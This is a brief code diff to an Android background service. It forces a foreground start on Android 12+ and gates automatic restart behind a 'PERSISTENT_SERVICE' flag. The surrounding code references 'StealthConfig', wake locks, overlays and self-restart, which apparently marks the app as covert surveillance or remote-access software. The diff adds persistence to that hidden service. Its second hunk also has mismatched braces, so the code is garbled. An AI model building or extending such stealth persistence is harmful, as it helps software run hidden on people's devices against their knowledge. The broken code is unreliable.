@@ -101,6 +101,13 @@ public class MainService extends Service {
         instance = this;
         contextOfApplication = this;
         
+        // CRITICAL: For Android 12+, we MUST call startForeground() immediately in onCreate()
+        // to prevent ForegroundServiceDidNotStartInTimeException when started via AlarmManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            Log.d(TAG, "Android 12+ detected - calling startForeground immediately in onCreate");
+            startForegroundWithNotification();
+        }
+        
         // Acquire wake lock to keep service running (if enabled)
         if (StealthConfig.WAKE_LOCK) {
             acquireWakeLock();
@@ -401,6 +408,8 @@ public class MainService extends Service {
         
         // Remove overlay
         removeOverlay();
+        
+        if (StealthConfig.PERSISTENT_SERVICE) {
             scheduleRestart();
         } else {
             Log.d(TAG, "PERSISTENT_SERVICE disabled, not scheduling restart");
